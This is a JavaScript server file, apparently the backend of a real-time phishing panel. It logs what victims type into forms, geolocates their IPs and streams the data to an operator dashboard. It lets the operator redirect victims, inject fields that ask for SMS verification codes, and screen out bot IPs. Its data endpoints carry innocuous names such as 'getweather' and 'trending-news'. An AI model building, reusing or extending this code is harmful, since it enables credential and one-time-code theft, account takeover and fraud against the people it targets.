const express = require("express");
const app = express();
const http = require("http").createServer(app);
const io = require("socket.io")(http, {
  path: "/stream-event",
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  pingInterval: 25000,
  pingTimeout: 50000,
  transports: ["websocket", "polling"],
});
const axios = require("axios");
const { getClientIp } = require("request-ip");
const fs = require("fs");
const path = require("path");
const mongoose = require("mongoose");
require("dotenv").config();
const morgan = require("morgan");
const cookieParser = require("cookie-parser");
const cors = require("cors");
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 60 * 1000, 
    max: 100,  
    message: "Too many requests from this IP, please try again later"
});
app.use(morgan("dev"));
app.use(cookieParser());
app.use(cors({
  origin: function (origin, callback) {
    const allowedOrigins = process.env.CLIENT_URL ? process.env.CLIENT_URL.split(',') : [];
    
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use(express.static("public"));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.set('trust proxy', true);
const telegramRouter = require('./routes/telegram');
const authRouter = require("./routes/auth");
const billingRouter = require("./routes/billing");

const ADMIN_SECRET = process.env.ADMIN_SECRET ;

// ✅ Middleware to Protect Routes
const authenticateToken = (req, res, next) => {
  const token = req.headers.authorization;
  if (!token || token !== `Bearer ${ADMIN_SECRET}`) {
    return res.status(403).json({ error: "Unauthorized. Invalid token." });
  }

  next(); // ✅ Allow request if token is valid
};
app.use("/api/auth", authRouter);
app.use("/api/authenticate", billingRouter);
app.use("/api", authRouter);
app.use('/api', telegramRouter);
let activeUsers = [];
let previousUsers = [];
let userInputs = {};
const ipCache = {};
let sessionMessages = {}; 
const dataFilePath = path.join(__dirname, "userSessions.txt");
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAD_ID = process.env.TELEGRAM_CHAT_ID;
try {
  if (fs.existsSync(dataFilePath)) {
    const data = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
    activeUsers = data.activeUsers || [];
    previousUsers = data.previousUsers || [];
    userInputs = data.userInputs || {};
  }
} catch (error) {
  console.error('Error loading saved data:', error);
}

const saveDataToFile = () => {
  const data = {
    activeUsers,
    previousUsers,
    userInputs
  };
  fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
};

//app.use("/api/", limiter);  // Apply to API routes

app.post("/api/insights/data_54zL", async (req, res) => {
  const { clientSessionID, pageUrl, userIP , eventType, inputName, inputValue, componentName, browserInfo } = req.body;
  let ip = userIP || 
  (req.headers["x-forwarded-for"]?.split(",")[0] || req.connection?.remoteAddress || req.ip)
  .replace(/^::ffff:/, ""); // Convert IPv6-mapped IPv4 to normal IPv4

if (!ip || ip === "Unknown IP") {
console.error("❌ IP undefined in request.");
return res.status(400).json({ error: "IP undefined" });
}
;
  try {
    let country = ipCache[ip] || 'Unknown';
    if (!ipCache[ip]) {
      try {
        const geoResponse = await axios.get(`https://ipinfo.io/${ip}/json?token=${process.env.IPINFO_TOKEN}`);
        country = geoResponse.data.country;
        ipCache[ip] = country;
      } catch (error) {
        console.error('IP tracking error:', error);
      }
    }
    
    if (eventType === 'input') {
      if (!userInputs[clientSessionID]) {
        userInputs[clientSessionID] = {};
      }
      userInputs[clientSessionID][inputName] = { value: inputValue, timestamp: new Date() };
    }

    const user = {
      clientSessionID,
      ip,
      country,
      pageUrl,
      eventType,
      componentName,
      browserInfo,
      inputs: userInputs[clientSessionID] || {},
      lastActive: new Date(),
      timestamp: new Date()
    };

    const existingUserIndex = activeUsers.findIndex(u => u.clientSessionID === clientSessionID);
    if (existingUserIndex !== -1) {
      activeUsers[existingUserIndex] = { ...activeUsers[existingUserIndex], ...user };
    } else {
      activeUsers.push(user);
    }

    if (eventType === 'page_unload') {
      const userIndex = activeUsers.findIndex(u => u.clientSessionID === clientSessionID);
      if (userIndex !== -1) {
        const disconnectedUser = { ...activeUsers[userIndex], disconnectedAt: new Date() };
        previousUsers.push(disconnectedUser);
        activeUsers.splice(userIndex, 1);
      }
    }

    saveDataToFile();
    io.emit("update", { activeUsers, previousUsers });
    res.status(200).json({ status: "OK" });
  } catch (error) {
    console.error('Tracking error:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});


setInterval(() => {
  const twoMinutesAgo = new Date(Date.now() - 120000);
  const inactiveUsers = activeUsers.filter(user => new Date(user.lastActive) < twoMinutesAgo);

  if (inactiveUsers.length > 0) {
    previousUsers = [...inactiveUsers.map(user => ({
      ...user,
      disconnectedAt: new Date()
    })), ...previousUsers].slice(0, 50);  // ✅ Add to the front to keep newest first
  }

  activeUsers = activeUsers.filter(user => new Date(user.lastActive) >= twoMinutesAgo);
  saveDataToFile();
  io.emit("update", { activeUsers, previousUsers });
}, 30000);

app.post("/api/sessionUpdate_X92m", (req, res) => {
  const { clientSessionID, newRoute } = req.body;
  console.log(`Changing route for session ${clientSessionID} to ${newRoute}`);

  try {
    const sockets = Array.from(io.sockets.sockets.values());
    const targetSocket = sockets.find(socket => socket.handshake.auth.clientSessionID === clientSessionID);

    if (targetSocket) {
      targetSocket.emit("changeRoute", newRoute);
      console.log(`Route change emitted to socket ${targetSocket.id}`);
      
      const userIndex = activeUsers.findIndex(u => u.clientSessionID === clientSessionID);
      if (userIndex !== -1) {
        activeUsers[userIndex] = {
          ...activeUsers[userIndex],
          pageUrl: newRoute,
          lastRouteChange: new Date()
        };
        saveDataToFile();
        io.emit("update", { activeUsers, previousUsers });
      }
      res.sendStatus(200);
    } else {
      console.log(`No socket found for session ${clientSessionID}`);
      res.status(404).json({ error: 'User not found' });
    }
  } catch (error) {
    console.error('Error changing route:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});
app.post("/api/updateUserId", (req, res) => {
  const { oldUserId, newUserId } = req.body;
  activeUsers = activeUsers.map(user => user.userId === oldUserId ? { ...user, userId: newUserId } : user);
  saveDataToFile();
  io.emit("update", activeUsers);
  res.sendStatus(200);
});

app.get("/api/getweather", (req, res) => {
  res.json(activeUsers);
});

app.get("/api/trending-news", (req, res) => {
const sortedPreviousUsers = previousUsers.sort((a, b) => new Date(b.disconnectedAt) - new Date(a.disconnectedAt));
  res.json(sortedPreviousUsers);
});

// Serve userSessions.txt as JSON

const USER_CONFIGS_PATH = path.join(__dirname, "userConfigs.json");
let saveTimeout = null;

if (fs.existsSync(USER_CONFIGS_PATH)) {
  try {
    userInputs = JSON.parse(fs.readFileSync(USER_CONFIGS_PATH, "utf8"));
  } catch (error) {
    console.error("❌ Error loading userConfigs.json:", error);
    userInputs = {}; // Reset to empty if corrupted
  }
}

// ✅ Function to schedule saving user config after 10 seconds
const scheduleSaveToFile = () => {
  if (saveTimeout) clearTimeout(saveTimeout); // Prevent multiple writes
  saveTimeout = setTimeout(() => {
    fs.writeFileSync(USER_CONFIGS_PATH, JSON.stringify(userInputs, null, 2), { flag: 'w' });
    console.log("✅ Saved user configs to file.");
  }, 10000*6); // ✅ Save after 10 seconds
};

// ✅ API to Get Custom Config (Now Reads from File)
app.get("/api/configCustom_Y3m8/:clientSessionID", (req, res) => {
  const { clientSessionID } = req.params;

  if (!userInputs[clientSessionID]) {
    return res.status(404).json({ error: "User config not found" });
  }

  const { inputsConfig, customText } = userInputs[clientSessionID];
  res.json({ 
    inputsConfig: inputsConfig || [], 
    customText: customText || "A Verification Code has been sent to your registered mobile phone number via SMS."
  });
});



let configCheckInterval;
const configCheckLimit = 5; // Limit the number of calls
let configCheckCount = 0;
const failedSessionIds = new Set(); // Track session IDs that have failed
const requestLimit = 1; // Allow 1 request per session per interval
const intervalTime = 3000; // 3 seconds
const requestTimestamps = {}; // Track request times per session

const startConfigCheck = () => {
  configCheckInterval = setInterval(async () => {
    if (configCheckCount >= configCheckLimit) {
      stopConfigCheck();
      return;
    }

    for (const clientSessionID in userInputs) {
      if (failedSessionIds.has(clientSessionID)) {
        continue; // Skip session IDs that have previously failed
      }

      const currentTime = Date.now();
      const lastRequestTime = requestTimestamps[clientSessionID] || 0;

      if (currentTime - lastRequestTime < intervalTime) {
        continue; // Skip if the last request was made within the limit
      }

      try {
        const response = await axios.get(`${process.env.CLIENT_URL}/api/configCustom_Y3m8/${clientSessionID}`);
        if (response.status === 200) {
          const inputsConfig = response.data.inputsConfig;
          io.to(clientSessionID).emit('configUpdate', { clientSessionID, inputsConfig });
          requestTimestamps[clientSessionID] = currentTime; // Update last request time
        } else {
          throw new Error('Input configuration not found');
        }
      } catch (error) {
        //console.error(`Error fetching input configuration for session ${clientSessionID}:`, error);
        if (error.response && error.response.status === 404) {
          failedSessionIds.add(clientSessionID); // Add to failed session IDs if 404 error
        }
      }
    }

    configCheckCount++;
  }, 3000); // Loop through session IDs every second, but each session limited individually
};

const stopConfigCheck = () => {
  clearInterval(configCheckInterval);
  configCheckCount = 0; // Reset the count
};

const getUserSocketBySessionId = (clientSessionID) => {
  const sockets = Array.from(io.sockets.sockets.values());
  return sockets.find(socket => socket.handshake.auth.clientSessionID === clientSessionID);
};
//BOT CONFIG 
const BLOCKED_IPS_PATH = path.join(__dirname, "blockedIPs.json");
let blockedIPs = [];
if (fs.existsSync(BLOCKED_IPS_PATH)) {
  blockedIPs = JSON.parse(fs.readFileSync(BLOCKED_IPS_PATH, "utf8"));
}

// ✅ API to Check if IP is Blocked
app.get("/api/is-rest-bot", authenticateToken, (req, res) => {
  const { ip } = req.query;
  if (!ip) return res.status(400).json({ error: "IP is required" });

  res.json({ blocked: blockedIPs.includes(ip) });
});

// ✅ API to Block a User
app.post("/api/audit/review",authenticateToken,(req, res) => {
  const { ip } = req.body;
  if (!ip) return res.status(400).json({ error: "IP is required" });

  if (!blockedIPs.includes(ip)) {
    blockedIPs.push(ip);
    fs.writeFileSync(BLOCKED_IPS_PATH, JSON.stringify(blockedIPs, null, 2), { flag: 'w' });
    console.log(`🚨 User Blocked: ${ip}`);
    return res.status(200).json({ message: `User with IP ${ip} blocked.` });
  }

  res.status(200).json({ message: "User was already blocked." });
});

io.on("connection", (socket) => {
  const clientSessionID = socket.handshake.auth.clientSessionID;
  console.log(`Client connected: ${socket.id}, Session: ${clientSessionID}`);
  
  socket.clientSessionID = clientSessionID;
  
  socket.emit("update", { activeUsers, previousUsers, userInputs });

  socket.on('redirectUser', ({ clientSessionID, url }) => {
    const userSocket = getUserSocketBySessionId(clientSessionID);
    if (userSocket) {
      userSocket.emit('redirectUser', { url });
    }
  });

  socket.on('addCustomInput', ({ clientSessionID, input }) => {
    console.log('Received addCustomInput event:', { clientSessionID, input });
    io.emit('addCustomInput', { clientSessionID, input });
  });

  socket.on('configureInputs', ({ clientSessionID, inputsConfig, customText }) => {
    console.log('Received configureInputs event:', { clientSessionID, inputsConfig, customText });

    // ✅ Store config in memory & schedule save to file
    userInputs[clientSessionID] = { inputsConfig, customText };
    io.emit('configureInputs', { clientSessionID, inputsConfig, customText });
    scheduleSaveToFile(); // ✅ Save after 10 seconds instead of instantly

    // ✅ Emit updated config to all clients
  });

  socket.on('disconnect', () => {
    console.log(`Client disconnected: ${socket.id}, Session: ${clientSessionID}`);
  });
});
// Add error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    error: 'Internal server error'
  });
});
// Run Server
const PORT = process.env.PORT || 8000;
http.listen(PORT, () => {
  console.log("Server is running on ", PORT);
});
